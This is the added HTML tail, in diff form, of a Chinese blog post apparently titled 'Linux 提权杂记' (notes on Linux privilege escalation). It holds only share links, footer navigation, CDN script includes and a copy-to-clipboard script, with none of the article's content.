+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&t=Linux 提权杂记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
